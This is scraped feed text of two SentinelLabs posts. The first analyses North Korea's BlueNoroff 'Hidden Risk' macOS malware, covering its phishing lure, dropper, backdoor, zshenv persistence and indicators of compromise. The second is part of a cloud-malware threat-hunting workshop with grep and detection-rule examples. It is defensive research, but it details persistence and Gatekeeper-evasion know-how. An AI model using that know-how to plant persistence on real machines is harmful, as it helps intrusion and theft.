src=\"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_16.jpg\" alt=\"Contents of the malicious ~/.zshenv, executed for every Zsh session\" width=\"1195\" height=\"281\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_16.jpg 1195w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_16-300x71.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_16-1024x241.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_16-768x181.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief_16-221x51.jpg 221w\" sizes=\"auto, (max-width: 1195px) 100vw, 1195px\" /><figcaption id=\"caption-attachment-108343\" class=\"wp-caption-text\">Contents of the malicious <em>~/.zshenv</em>, executed for every Zsh session</figcaption></figure>\n<h2>Network Infrastructure</h2>\n<p>Analysis of the actor operated and controlled network infrastructure associated with the Hidden Risk campaign further corroborates our confidence in attribution to DPRK’s BlueNoroff threat actor.

In April 2023, researchers detailed an APT campaign targeting macOS users with multi-stage malware that culminated in a Rust backdoor capable of downloading and executing further malware on infected devices. ‘RustBucket’, as they labeled it, was attributed with strong confidence to the BlueNoroff APT. In May 2023, ESET researchers discovered a second RustBucket variant targeting macOS users, followed by Elastic’s discovery in July that year of a third variant that included a LaunchAgent for persistence. In November 2023, Elastic also reported on another DPRK campaign targeting blockchain engineers of a crypto exchange platform with KandyKorn malware. Further analysis by SentinelLabs was able to connect the KandyKorn and RustBucket campaigns.\nIn early September 2024, the FBI began warning that North Korea was conducting “highly tailored, difficult-to-detect social engineering campaigns against employees of decentralized finance (“DeFi”), cryptocurrency, and similar businesses to deploy malware and steal company cryptocurrency”. Researchers from Jamf subsequently followed up on this report a few weeks later detailing an attack attempt that deployed malware masquerading as a Visual Studio updater.\nIn October 2024, SentinelLabs observed a phishing attempt on a crypto-related industry that delivered a dropper application and a payload bearing many of the hallmarks of these previous attacks. We believe the campaign likely began as early as July 2024 and uses email and PDF lures with fake news headlines or stories about crypto-related topics. We dubbed this campaign ‘Hidden Risk’ and detail its operation and indicators of compromise below, including the use of a novel persistence mechanism abusing the zshenv configuration file.\nInfection Vector\nInitial infection is achieved via phishing email containing a link to a malicious application. The application is disguised as a link to a PDF document relating to a cryptocurrency topic such as “Hidden Risk Behind New Surge of Bitcoin Price”, “Altcoin Season 2.0-The Hidden Gems to Watch” and “New Era for Stablecoins and DeFi, CeFi”.\nThe emails hijack the name of a real person in an unrelated industry as a sender and purport to be forwarding a message from a well-known crypto social media influencer. In the case of the ‘Hidden Risk’ pdf, the threat actors copied a genuine research paper entitled ‘Bitcoin ETF: Opportunities and risk’ by an academic associated with the University of Texas and hosted online by the International Journal of Science and Research Archive (IJSRA).\nThe fake PDF displayed to targets (left) and the original source document hosted online (right)\nUnlike earlier campaigns attributed to BlueNoroff, the Hidden Risk campaign uses an unsophisticated phishing email that does not engage the recipient with contextually-relevant content, such as reference to personal or work-related information.\nAlso of note is that the sender domain in our observed incident, kalpadvisory[.]com, has been noted for spamming among online communities involved in the Indian stock market.\nSocial media users complain about spam calls from Kalp Advisory\nThe ‘open’ link in the phishing email hides a URL to another domain, delphidigital[.]org. The full URL currently serves a benign form of the Bitcoin ETF document with titles that differ over time. However, at some point, this URL has or does switch to serving the first stage of a malicious application bundle entitled ‘Hidden Risk Behind New Surge of Bitcoin Price.app’ (3f17c5a7d1e7fd138163d8039e614b8a967a56cb).\nApplication icon for the Stage 1 dropper\nFirst Stage | “Bait and Switch” Dropper Application Replaces PDF\nThe first stage is a Mac application written in Swift displaying the same name as the expected PDF, “Hidden Risk Behind New Surge of Bitcoin Price.app”. The application bundle has the bundle identifier Education.LessonOne and contains a universal architecture (i.e., arm64 and x86-64) Mach-O executable named LessonOne.\nThe application bundle was signed and notarized on 19 October, 2024 with the Apple Developer ID “Avantis Regtech Private Limited (2S8XHJ7948)”. The signature has since been revoked by Apple.\nCode signing details for the Hidden Risk Behind New Surge of Bitcoin Price.app\nOn launch, the application downloads the decoy “Hidden Risk” pdf file from a Google Drive share and opens it using the default macOS PDF viewer (typically Preview). Similar TTPs were previously reported by researchers at Kandji in August. The PDF is written into a temporary file before being moved to /Users/Shared using NSFileManager’s moveItemAtURL:toURL:error method.\nThe malware then downloads and executes a malicious x86-64 binary sourced from matuaner[.]com via a URL hard-coded into the Stage 1 binary. Since by default macOS won’t allow an application to download from an insecure HTTP protocol, the application’s Info.plist specifies this domain in the dictionary for its NSAppTransportSecurity key and sets the NSExceptionAllowsInsecureHTTPLoads value to “true”.\nThe Stage 1’s Info.plist adds the C2 domain as an exception for Apple’s App Transport Security settings\nThe Info.plist also indicates that the application was built on a macOS 14.2 Sonoma machine but will run on both Intel and Apple silicon Macs with macOS 12 Monterey or later.\nSecond Stage | ‘growth’ x86-64 Mach-O Backdoor\nThe malicious binary downloaded by the first stage dropper is a single architecture Mach-O x86-64 executable (7e07765bf8ee2d0b2233039623016d6dfb610a6d), meaning that although the parent dropper will execute on both Intel and Apple silicon machines, the Stage 2 will only run on Intel architecture Macs or Apple silicon devices with the Rosetta emulation framework installed. The binary, written in C++, has the name ‘growth’, weighs in at around 5.1 MB and is not code signed at all (SentinelLabs was able to share the file for researchers here).\nThe executable contains a number of identifiable functions, which we outline below, with the overall objective being to act as a backdoor to execute remote commands.\nSome interesting functions in the ‘growth’ binary\nOn execution, the ‘growth’ binary performs the following actions.\nCalls the sym.install_char__char_ function to install persistence. We discuss this in the next section.\nRuns several commands to gather environmental information from the host and generate a random UUID of length 16. These commands include sw_vers ProductVersion, sysctl hw.model and sysctl kern.boottime.\nCalculates the current date and time and performs ps aux to list running processes.\nSends the string “ci”, the random UUID and the gathered host data to a remote server using the DoPost function and awaits the C2 response.\nUses the ProcessRequest function to parse the response. If the first byte in the response is 0x31, it sends the string “cs”, the random UUID and the value -1 using DoPost and exits. If the first byte in the response is 0x30, it executes the SaveAndExec function, sends the string “cs”, the random UUID and the value 0 using DoPost. The SaveAndExec function reads the C2 response, parses it, saves it into a random, hidden file at /Users/Shared/.XXXXXX, and executes it.\nThe ProcessRequest function parses the C2 response\nSleeps for 60 seconds and starts the flow again from step 3.\nThe DoPost function is used to make the HTTP Post request to the C2 using libcurl. The first argument is the C2 URL, the second argument is the data sent in the body of the POST request, and the third argument is the data pointer passed to the write callback.\nThe DoPost function constructs and sends the HTTP request\nWe have previously noted that this same User-Agent string, mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0), appeared in RustBucket malware in 2023. The User-Agent string also uses cur1-agent (using a 1 in place of the l in “curl”) as reported by Elastic, a fairly unique indicator we have not observed elsewhere.\nWe also see similarities in the way that earlier malware parsed the response from the C2, essentially comparing one of two values as decision logic between awaiting further response, exiting or reading and writing a remote command to file. The ProcessRequest function used for this purpose was also the name of an ObjCShellz payload observed in a previous campaign.\nThe SaveAndExec function is responsible for executing any commands received from the C2. This function takes two parameters, the payload received and the length of the payload. The function parses the malicious payload and calculates indices related to the presence of the characters “#” and the “:”, receiving data from the C2 in the form 0#\\0:command.\nSaveAndExec function parses the received script for embedded commands\nBased on the calculated indices, it creates a random file name of length 6 and writes the received command as a hidden file to /Users/Shared/.%s. It then uses chmod 0x777 to set the permissions of the file to world read, write and execute, and finally executes it via popen.\nThe SaveAndExec function changes the file’s permissions and then executes it\nPersistence via Zshenv\nThe backdoor’s operation is functionally similar to previous malware attributed to this threat actor, but what makes it especially interesting is the persistence mechanism, which abuses the Zshenv configuration file.\nZshenv is one of several optional configuration files used by the Zsh shell. At the user level, it sits as a hidden file in the Home directory, ~/.zshenv. A system wide version can also be located at /etc/zshenv. If it exists, the file is sourced for all Zsh sessions, including interactive and non-interactive shells, non-login shells and scripts. It is also read before all other Zsh startup files.\nInterestingly, previous malware samples used by the same threat actor have referenced zsh_env in their naming convention, but not actually used the mechanism. In an earlier campaign, BlueNoroff used the ~/.zshrc config file to achieve persistence. However, this is a less reliable form of persistence since the file is only sourced when a user launches an interactive Terminal session or subsession from an existing console.\nInfecting the host with a malicious Zshenv file allows for a more powerful form of persistence. While this technique is not unknown, it is the first time we have observed it used in the wild by malware authors. It has particular value on modern versions of macOS since Apple introduced user notifications for background Login Items as of macOS 13 Ventura. Apple’s notification aims to warn users when a persistence method is installed, particularly oft-abused LaunchAgents and LaunchDaemons. Abusing Zshenv, however, does not trigger such a notification in current versions of macOS.\nIn the binary, installation of the persistence mechanism is handled by the sym.install_char__char_ function. The mechanism checks for a hidden touch file (zero byte) in the /tmp/ folder called .zsh_init_success. If the file does not exist, then the ‘growth’ binary is called and the touch file is created.\nContents of the malicious ~/.zshenv, executed for every Zsh session\nNetwork Infrastructure\nAnalysis of the actor operated and controlled network infrastructure associated with the Hidden Risk campaign further corroborates our confidence in attribution to DPRK’s BlueNoroff threat actor. Additionally, infrastructure analysis provides new insight into an extensive cluster of activity over the last year plus, and provides further links to industry reporting mentioned above, and others in the community.\nOver recent months, the actor has built a network of connected infrastructure often themed around their cryptocurrency interests, methods of delivering malware lures, and mimicking legitimate Web3, cryptocurrency, fintech, and investment organizations to appear legitimate. NameCheap is the predominant domain registrar being abused. Virtual server hosting services such as Quickpacket, Routerhosting, Hostwinds, and others are the most commonly used based on our observations.\nVarious methods of pivoting across network infrastructures and services can be used to connect the Hidden Risk campaign to domains themed around the following organizations, indicating the actors interest in potential targeting and spoofing for targeting on other organizations.\nCryptocurrency Technologies\nDelphi Digital, Solana Labs, Douro Labs, bitsCrunch, Caladan\n\n\nInvestment and Capital Entities\nMaelstrom Fund, Selini Capital, Flori Ventures, ARK Invest, Long Journey Ventures\n\n\nGeneric IT/Communication\nVirtual Meetings (Zoom, generic), Software Updates (macOS, browsers, generic)\n\n\n\n\nWhen examining the infrastructure of the campaign detailed above in infrastructure analysis tools such as Validin, we can identify clear relations between the initial stage 1 delivery domain (matuaner[.]com) and the IPs 45.61.135[.]105 and 172.86.108[.]47. These two IPs, in combination with an overlapping certificate use, link to a variety of domains that open the door to the larger and longer running history of BlueNoroff activity (green lines), and additional lesser confidence infrastructure to explore further (orange dotted lines).\nPivoting from sample delivery to initial set of infrastructure\nAdditional valuable pivoting can be achieved by analyzing attributes like DNS TXT records linked to domains that the actor may be using for phishing email delivery. For instance, we’ve observed the actor abusing email marketing automation tools, such as Brevo, where they go so far as to verify domain ownership to meet email authentication standards—an effort to bypass spam and phishing detection filters.\nPivoting initial infrastructure to wider set, though DNS TXT Records\nBeyond direct pivoting based on infrastructure and overlapping response data, we also identified additional domains registered using similar methods that reflect previous organization naming themes across various top level domains (TLDs), though these domains have not yet been linked to any known actor activity. For instance, by analyzing bulk domain search datasets, we found related but non-pivotable domains based on “Selini Capital,” such as selinicapital[.]network. This approach has proven effective in uncovering additional BlueNoroff domains linked to the Hidden Risk activity cluster.\nExample Regular Expression: /s+e+l+i+n+i+c+a+p+i+t+a+l+\\.[a-z0-9-]+/\nBulk domain scanning, past 180 days, showing registration summary\nThe extensive collection of BlueNoroff infrastructure we’ve gathered over the years, recently expanded through the latest Hidden Risk campaign activity, prevents us from detailing every unique pivoting method as this actor continues to evolve. As with all quality threat intelligence, our goal is to aid defenders while carefully managing the exposure of our tracking techniques to the actor. However, we are sharing a broader set of associated infrastructure in the Indicator of Compromise section below.\nConclusion\nOver the last 12 months or so, North Korean cyber actors have engaged in a series of campaigns against crypto-related industries, many of which involved extensive ‘grooming’ of targets via social media. We observe that the Hidden Risk campaign diverts from this strategy taking a more traditional and cruder, though not necessarily any less effective, email phishing approach. Despite the bluntness of the initial infection method, other hallmarks of previous DPRK-backed campaigns are evident, both in terms of observed malware artifacts and associated network infrastructure, as discussed extensively throughout this post.\nWe might speculate that heightened attention on previous DRPK campaigns could have reduced the effectiveness of previous ‘social media grooming’ attempts, perhaps as a result of intended targets in DeFi, ETF and other crypto-related industries becoming more wary, but it is equally likely that such state-backed threat actors have sufficient resources to pursue multiple strategies simultaneously.\nOne factor that is relatively consistent throughout many of these campaigns is that the threat actors are seemingly able to acquire or hijack valid Apple ‘identified developer’ accounts at will, have their malware notarized by Apple, and bypass macOS Gatekeeper and other built-in Apple security technologies. In light of this and the general increase in macOS crimeware observed across the security industry, we encourage all macOS users, but particularly those in organizational settings, to harden their security and increase their awareness of potential risks.\nIndicators of Compromise\nSHA1\nFunction\nFile\nArch\n\n\n05c178891ca1e65af53bbcfdbec573da3f74d176\nDropper\nMacho\narm64\n\n\n3f17c5a7d1e7fd138163d8039e614b8a967a56cb\nDropper\nApp\nUniversal\n\n\n7e07765bf8ee2d0b2233039623016d6dfb610a6d\nBackdoor\nMacho\nx86_64\n\n\nbaf4da6b89b7d7cbf24c9deef5984ef9dfd52e6a\nDropper\nMacho\nUniversal\n\n\ne5d97afa5f1501b3d5ec1a471dc8a3b8e2a84fdb\nDropper\nMacho\nx86_64\n\n\n\n\nIP Addresses\nDomains\nanalysis.arkinvst[.]com\nappleaccess[.]pro\narkinvst[.]com\natajerefoods[.]com\nbuy2x[.]com\ncalendly[.]caladan[.]video\ncardiagnostic[.]net\ncmt[.]ventures\ncommunity.edwardcaputo[.]shop\ncommunity.kevinaraujo[.]shop\ncommunity.selincapital[.]com\ncommunity.selincapital[.]com\ncustomer-app[.]xyz\ndelphidigital[.]org\ndoc.solanalab[.]org\ndourolab[.]xyz\ndrogueriasanjose[.]net\nedwardcaputo[.]shop\nemail.sellinicapital[.]com\nevalaskatours[.]com\nhappyz[.]one\nhwsrv-1225327.hostwindsdns[.]com\ninfo.ankanimatoka[.]com\ninfo.customer-app[.]xyz\nkevinaraujo[.]shop\nmaelstromfund[.]org\nmaelstroms[.]fund\nmatuaner[.]com\nmbupdate.linkpc[.]net\nmc.tvdhoenn[.]net\nmeet.caladan[.]video\nmeet.caladangroup[.]xyz\nmeet.hananetwork[.]video\nmeet.selinicapital[.]info\nmeet.selinicapital[.]online\nmeet.selinicapital[.]xyz\nmeet.sellinicapital[.]com\nmeeting.sellinicapital[.]com\nmeeting.zoom-client[.]com\nmg21.1056[.]uk\nnodnote.com\nonline.selinicapital[.]info\nonline.zoom-client[.]com\npanda95sg[.]asia\npixelmonmmo[.]net\npresentations[.]life\nselincapital[.]com\nselinicapital[.]info\nselinicapital[.]network\nselinicapital[.]online\nsellinicapital[.]com\nsendmailed[.]com\nsendmailer[.]org\nshh5.baranftw[.]xyz\ntvdhoenn[.]net\nverify.selinicapital[.]info\nversionupdate.dns[.]army\nwww.buy2x[.]com\nwww.delphidigital[.]org\nwww.frameworks[.]ventures\nwww.happyz[.]one\nwww.huspot[.]blog\nwww.maelstromfund[.]org\nwww.panda95sg[.]asia\nwww.prismlab[.]xyz\nwww.sellinicapital[.]com\nwww.sendmailed[.]com\nwww.sendmailer[.]org\nwww.yoannturp[.]xyz\nxu10.1056[.]uk\nzoom-client[.]com","enclosure":{"url":"https://www.sentinelone.com/wp-content/uploads/2024/11/BNThief-feature.jpg","length":"376259","type":"image/jpeg"},"dc:creator":"Raffaele Sabato, Phil Stokes &amp; Tom Hegel","content":"SentinelLabs has observed a suspected DPRK threat actor targeting Crypto-related businesses with novel multi-stage malware.","contentSnippet":"SentinelLabs has observed a suspected DPRK threat actor targeting Crypto-related businesses with novel multi-stage malware.","guid":"https://www.sentinelone.com/?post_type=labs&p=108328","categories":["DPRK"],"isoDate":"2024-11-07T10:55:47.000Z","tag":"intel"},{"creator":"Alex Delamotte","title":"Cloud Malware | A Threat Hunter’s Guide to Analysis, Techniques and Delivery","link":"https://www.sentinelone.com/labs/cloud-malware-a-threat-hunters-guide-to-analysis-techniques-and-delivery/","pubDate":"Thu, 24 Oct 2024 15:17:35 +0000","content:encoded":"<p>As many researchers have noticed, malware in the cloud is different. Perhaps more strikingly different than Windows versus Linux threats, cloud services are targeted through entirely different methods altogether.</p>\n<p>At <a href=\"https://www.labscon.io/\" target=\"_blank\" rel=\"noopener noreferrer\">LABScon 2024</a>, I gave a workshop <a href=\"https://www.labscon.io/speakers/alex-delamotte/\" target=\"_blank\" rel=\"noopener noreferrer\">Taxonomy in the Troposphere</a> that outlines categories of cloud threats and how to approach analyzing and hunting them. The workshop structure highlighted three general sections to approach this problem:</p>\n<ul>\n<li aria-level=\"1\">What cloud malware looks like</li>\n<li aria-level=\"1\">Cloud malware taxonomy and exercises</li>\n<li aria-level=\"1\">How to approach threat hunting in the cloud</li>\n</ul>\n<h2>What Does Cloud Malware Look Like?</h2>\n<p>Cloud threats are tailored for the specific environment or service being targeted. There are no comprehensive infostealers as are commonplace on platforms like macOS or Windows. Instead, individual facets of cloud security are targeted through a variety of means. Attackers run scripts remotely that interact with the targeted service’s API to achieve a goal like collecting credentials or automating the process of sending spam messages in bulk through a cloud or SaaS provider.</p>\n<p>We covered several unique families of cloud threats, including <a href=\"https://www.sentinelone.com/labs/dissecting-alienfox-the-cloud-spammers-swiss-army-knife/\" target=\"_blank\" rel=\"noopener noreferrer\">AlienFox</a>, a cloud spamming tool; <a href=\"https://www.sentinelone.com/labs/cloudy-with-a-chance-of-credentials-aws-targeting-cred-stealer-expands-to-azure-gcp/\" target=\"_blank\" rel=\"noopener noreferrer\">TeamTNT’s</a> credential harvesting scripts; and <a href=\"https://www.cadosecurity.com/blog/cado-discovers-denonia-the-first-malware-specifically-targeting-lambda\" target=\"_blank\" rel=\"noopener noreferrer\">Denonia</a>, a cryptominer tailored to run in AWS serverless Lambda environment.</p>\n<p>We also explored the objectives of cloud attacks. These are less distinct from threats targeting any other attack surface, including:</p>\n<ul>\n<li aria-level=\"1\">Cryptomining</li>\n<li aria-level=\"1\">Spamming</li>\n<li aria-level=\"1\">Data theft</li>\n<li aria-level=\"1\">Espionage</li>\n<li aria-level=\"1\">Extortion</li>\n<li aria-level=\"1\">Disruption, attacks on availability</li>\n</ul>\n<p>Cloud threat delivery and installation is also different. Actors frequently rely on web application or SaaS misconfigurations that enable access to resources that should be restricted.</p>\n<p>Examples of this include exposed environment files–a very common occurrence in <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Laravel_Cheat_Sheet.html\" target=\"_blank\" rel=\"noopener noreferrer\">Laravel</a> implementation–as well as exposed <a href=\"https://0x1bitcrack3r.medium.com/how-i-found-misconfigured-jenkins-instances-of-different-organizations-using-shodan-9837088f4ec7\" target=\"_blank\" rel=\"noopener noreferrer\">Jenkins</a> instances. Exploitation of unpatched security vulnerabilities is perennially popular given the high prevalence of web frameworks running in cloud services.</p>\n<p>Credential exposure is a huge problem: organizations often unknowingly upload service credentials to publicly accessible code sharing services like Docker Hub, GitHub, or Pastebin, as outlined in a recent <a href=\"https://cybenari.com/2024/08/whats-the-worst-place-to-leave-your-secrets/\" target=\"_blank\" rel=\"noopener noreferrer\">post</a> by Cybenari, which explores how long it takes for actors to identify and use the credentials.</p>\n<p>My colleagues at SentinelOne recently published an excellent <a href=\"https://www.sentinelone.com/blog/cloud-and-container-the-attack-defend-series/\" target=\"_blank\" rel=\"noopener noreferrer\">summary</a> of the most commonly leveraged cloud threat vectors, which complimented this workshop’s focus.</p>\n<h2>Cloud Malware Taxonomy &amp; Analysis</h2>\n<p>Taxonomy in the cloud can be difficult because many tools are based on full source code and actors often take a feature from one tool and roll it into another one. This makes attribution complicated, if not challenging. Because these tools are not deployed on the victim machine and are run on the attacker’s system, it can be unclear which tool used the code first.</p>\n<p>Cloud researchers often obtain samples from sources like VirusTotal, Pastebin, or from cybercriminal forums or Telegram channels. Unlike threats that target endpoints, which typically drop binaries or scripts that run in memory, threats running against cloud services leave only logs showing which APIs were called and in which order. While these can be valuable indicators for detection, they leave much to be desired in the way of seeing how actors implement their tooling.</p>\n<p>Analyzing cloud tools can be complex because some scripts are very large. I have analyzed several scripts with more than 10,000 lines of code. To make this task more manageable, researchers can take several approaches.</p>\n<p>One of my preferred methods is to perform a word frequency analysis that eliminates terms commonly used by the programming language of the script, revealing terms that are used highly frequently or infrequently. These outliers can provide strategic analytic starting points by highlighting terms that the tool focuses on, such as APIs, technologies, or credential categories.</p>\n<p>I use a Python script designed to analyze Python files for the occurrence of each term. The script reads the contents of the target file, filters out common terms used by the Python programming language, and writes output showing how many times each remaining term occurs.</p>\n<p>Running this script against a modified version of <a href=\"https://www.cadosecurity.com/blog/legion-an-aws-credential-harvester-and-smtp-hijacker\" target=\"_blank\" rel=\"noopener noreferrer\">Legion Stealer</a> attributed to actor CobraEgy was quite helpful in reducing the volume of noise. The CobraEgy script contains more than 21,000 lines of Python code–a very daunting analysis task. The word frequency analysis script gave 3400 lines of words and the frequency they occurred. While this is still large, it’s easy to scroll through the results and find interesting terms.</p>\n<p>In the following output, around line 40 there are many terms that show the tool capabilities likely include spamming (<code>mailuser</code>, <code>mailport</code>, <code>mailfrom</code>, <code>host</code>, <code>get_smtp</code>, <code>smtp_login</code>), web server activity (<code>apache</code>), and cloud service activity (<code>aws_reg</code>, <code>aws_key</code>).</p>\n<figure id=\"attachment_107676\" aria-describedby=\"caption-attachment-107676\" style=\"width: 205px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_6.jpg\" alt=\"Word frequency analysis output from CobraEgy tool\" width=\"205\" height=\"499\" class=\"size-full wp-image-107676\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_6.jpg 205w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_6-123x300.jpg 123w\" sizes=\"auto, (max-width: 205px) 100vw, 205px\" /><figcaption id=\"caption-attachment-107676\" class=\"wp-caption-text\">Word frequency analysis output from CobraEgy tool</figcaption></figure>\n<p>Once you identify potentially interesting functionality, you can analyze those features. In the workshop,  participants were able to dive into commonly referenced cloud tool terms, such as <code>aws</code>, <code>azure</code>, <code>profile</code>, <code>admin</code>, <code>password</code>, <code>server</code>, <code>host</code>, <code>username</code>, and <code>port</code>.</p>\n<p>Looking at how these terms are used can provide insight into the tool’s capability and even yield valuable indicators of compromise that can be used to categorize the tool or an actor’s campaign. This approach is helpful when looking at many scripts at once, as you can run it as a grep command against an entire directory:</p>\n<pre>\r\ngrep -RinE --include=\\*.{py,sh} '\\b(aws|azure|profile|admin|password|server|host|username|port)\\b' /path/to/search\r\n</pre>\n<p>For simplicity, I asked students to run against only one of the malicious scripts. The following results from a TeamTNT shell script revealed interesting clues to the tool’s capability, such as credential files, cloud service provider capabilities, and hardcoded credentials to connect to an external server.</p>\n<figure id=\"attachment_107679\" aria-describedby=\"caption-attachment-107679\" style=\"width: 988px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_3.jpg\" alt=\"Keyword search against TeamTNT shell script\" width=\"988\" height=\"273\" class=\"size-full wp-image-107679\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_3.jpg 988w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_3-300x83.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_3-768x212.jpg 768w\" sizes=\"auto, (max-width: 988px) 100vw, 988px\" /><figcaption id=\"caption-attachment-107679\" class=\"wp-caption-text\">Keyword search against TeamTNT shell script</figcaption></figure>\n<p>Researchers can then cross-reference the search results against the original script, revealing its functionality.

Next, the container installs several utilities:</p>\n<ul>\n<li aria-level=\"1\"><code>tor</code>: a binary that enables routing requests through the Tor anonymization network</li>\n<li aria-level=\"1\"><code>curl</code>, <code>wget</code>: utilities for creating HTTP requests</li>\n<li aria-level=\"1\"><code>libproxychains3</code>: enables routing connections through proxy servers for anonymity</li>\n<li aria-level=\"1\"><code>masscan</code>: network scanning utility used to identify new targets</li>\n</ul>\n<p>These tools are used for identifying new victims and propagating the actor’s tools. The container also extracts several files from the base image, which are saved locally to the <code>/usr/bin</code> path and given read, write, and execute permissions. Researchers can mount the image–which I recommend doing in an isolated malware analysis environment–and copy the files to the local system for analysis.</p>\n<h2>Hunting in the Cloud</h2>\n<p>The workshop concluded by summarizing which artifacts from cloud tools can be hunted, as well as two types of hunting approaches: targeted and wide.</p>\n<p>A targeted hunting approach searches for specific indicators that are unique to a cloud threat family, such as Androxgh0st, FBot, or TeamTNT tools. For example, the following Androxgh0st strings are from unique variables recycled across many tools, including AlienFox:</p>\n<figure id=\"attachment_107678\" aria-describedby=\"caption-attachment-107678\" style=\"width: 1004px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_4.jpg\" alt=\"Targeted VirusTotal Livehunt rule searching for Androxgh0st strings\" width=\"1004\" height=\"214\" class=\"size-full wp-image-107678\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_4.jpg 1004w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_4-300x64.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_4-768x164.jpg 768w\" sizes=\"auto, (max-width: 1004px) 100vw, 1004px\" /><figcaption id=\"caption-attachment-107678\" class=\"wp-caption-text\">Targeted VirusTotal Livehunt rule searching for Androxgh0st strings</figcaption></figure>\n<p>In the following example from FBot, the tool makes requests to a Lithuanian fashion designer’s website–<code>robertkalinkin[.]com</code>–to validate Paypal accounts.

Wide hunting rules that I have written search for scripts on VirusTotal that exhibit sets of behaviors, like references to Kubernetes and binaries associated with downloading additional payloads, such as <code>wget</code>. The rule also filters for script file types, which are more likely to be associated with cloud attack tools.</p>\n<figure id=\"attachment_107681\" aria-describedby=\"caption-attachment-107681\" style=\"width: 1736px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1.jpg\" alt=\"Wide VirusTotal Livehunt rule searching for terms related to Kubernetes and download activity\" width=\"1736\" height=\"406\" class=\"size-full wp-image-107681\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1.jpg 1736w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1-300x70.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1-1024x239.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1-768x180.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1-1536x359.jpg 1536w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_1-221x51.jpg 221w\" sizes=\"auto, (max-width: 1736px) 100vw, 1736px\" /><figcaption id=\"caption-attachment-107681\" class=\"wp-caption-text\">Wide VirusTotal Livehunt rule searching for terms related to Kubernetes and download activity</figcaption></figure>\n<p>Another wide hunting rule looks for references to popular cloud service providers (CSP) and URLs for Telegram channels. This combination indicates that the tool is conducting suspicious behavior by nature of using Telegram and that it is cloud focused by referencing a CSP. Wide hunting rules often generate much noise, and the CSP Telegram rule was no exception.</p>\n<p>To minimize noise from files referencing the Dawson Creek time zone in British Columbia, I added the <code>$negate1</code> variable, which excludes results when the <code>Dawson</code> string is referenced.</p>\n<figure id=\"attachment_107675\" aria-describedby=\"caption-attachment-107675\" style=\"width: 1836px\" class=\"wp-caption aligncenter\"><img loading=\"lazy\" decoding=\"async\" src=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_7.jpg\" alt=\"Wide VirusTotal Livehunt rule searching for references to CSPs and Telegram\" width=\"1836\" height=\"582\" class=\"size-full wp-image-107675\" srcset=\"https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_7.jpg 1836w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_7-300x95.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_7-1024x325.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_7-768x243.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2024/10/Cloud_Mw_Analysis_7-1536x487.jpg 1536w\" sizes=\"auto, (max-width: 1836px) 100vw, 1836px\" /><figcaption id=\"caption-attachment-107675\" class=\"wp-caption-text\">Wide VirusTotal Livehunt rule searching for references to CSPs and Telegram</figcaption></figure>\n<h2>Conclusion</h2>\n<p>In this workshop at <a href=\"https://www.labscon.io/\" rel=\"noopener\" target=\"_blank\">LABScon24</a>, I provided aspiring cloud researchers with several approaches that they can use as an entry point into cloud threat research and hunting. Using the Word Frequency Analysis approach is extremely helpful for analyzing huge scripts with thousands of lines of code. Similarly, the targeted keyword approach helps identify areas of a script that perform crucial cloud-centric activities. A similar approach could be used to identify CSP APIs when searching for a specific action. For investigations involving a container that is not running in a live environment, Docker Desktop remains a solid starting point to identify features of the container and to extract details that provide insight into the container’s capabilities.</p>\n<p>Threat hunting in the cloud is different from hunting binaries, as many malware researchers primarily do. The workshop outlined my approach to hunting several cloud threat families by using unique strings, such as Telegram handles or variable names, that frequently reoccur across these tools. The broad threat hunting approach can be noisy and time-consuming, but it has yielded many new findings that may have otherwise gone unseen.</p>\n<hr>\n<p>Interested in attending or presenting at LABScon25? <strong>Learn more <a href=\"https://labscon.io\" rel=\"noopener\" target=\"_blank\">here</a>.</strong></p>\n","content:encodedSnippet":"As many researchers have noticed, malware in the cloud is different.

